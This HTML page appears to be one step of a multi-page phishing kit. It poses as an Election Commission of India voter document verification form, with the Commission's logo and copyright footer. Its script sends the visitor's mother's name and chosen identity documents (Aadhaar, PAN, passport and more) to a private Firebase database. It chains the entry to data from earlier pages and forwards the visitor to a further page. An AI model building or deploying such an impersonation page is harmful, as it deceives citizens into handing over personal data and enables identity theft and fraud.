<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voter ID - Document Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
        .form-container h2 { text-align: center; margin-bottom: 20px; color: #0056b3; font-size: 22px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 13px; }
        .form-group input[type="text"] { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
        .docs-container { border: 1px solid #ccc; border-radius: 6px; padding: 12px; max-height: 180px; overflow-y: auto; background: #fafafa; }
        .checkbox-label { display: flex; align-items: center; margin-bottom: 10px; font-size: 14px; color: #333; cursor: pointer; }
        .checkbox-label input { margin-right: 10px; width: 16px; height: 16px; accent-color: #0056b3; }
        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Logo Section Added Here -->
        <div style="text-align: center; margin-bottom: 15px;">
            <img src="logo.png" alt="Election Commission Logo" style="max-width: 75px; height: auto;">
        </div>
        <h2>Document Verification</h2>
        <form id="docForm">
            <div class="form-group">
                <label for="motherName">Enter Mother's Name</label>
                <input type="text" id="motherName" name="motherName" placeholder="Enter mother's full name" required>
            </div>
            <div class="form-group">
                <label>Select Supporting Documents (Choose any)</label>
                <div class="docs-container">
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Aadhaar Card"> Aadhaar Card</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="PAN Card"> PAN Card</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Passport"> Passport</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Electricity Bill"> Electricity Bill</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Water Bill"> Water Bill</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="10th Certificate"> 10th Certificate</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Ration Card"> Ration Card</label>
                </div>
            </div>
            <button type="submit" id="submitBtn" class="btn-next">Next</button>
        </form>
        <div class="footer-text">
            © 2026 Election Commission of India. All rights reserved.
        </div>
    </div>

    <!-- Firebase Integration Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('docForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const motherName = document.getElementById('motherName').value;
            const selectedDocs = [];
            document.querySelectorAll('input[name="documents"]:checked').forEach((checkbox) => {
                selectedDocs.push(checkbox.value);
            });
            const documentsString = selectedDocs.length > 0 ? selectedDocs.join(', ') : 'None Selected';

            // पिछले पेज से सहेजी गई Firestore Document ID प्राप्त करें
            const docId = localStorage.getItem('voterDocId');
            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                // इसी यूज़र के रिकॉर्ड में माता का नाम और डॉक्यूमेंट्स अपडेट करें
                await updateDoc(docRef, {
                    motherName: motherName,
                    documents: documentsString,
                    currentStep: "Step 3 Completed"
                });

                setTimeout(() => {
                    window.location.href = "page4.html"; 
                }, 1000);
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("डेटा सेव करने में समस्या हुई, कृपया पुनः प्रयास करें।");
                btn.disabled = false;
                btn.innerText = "Next";
            }
        });
    </script>
</body>
</html>
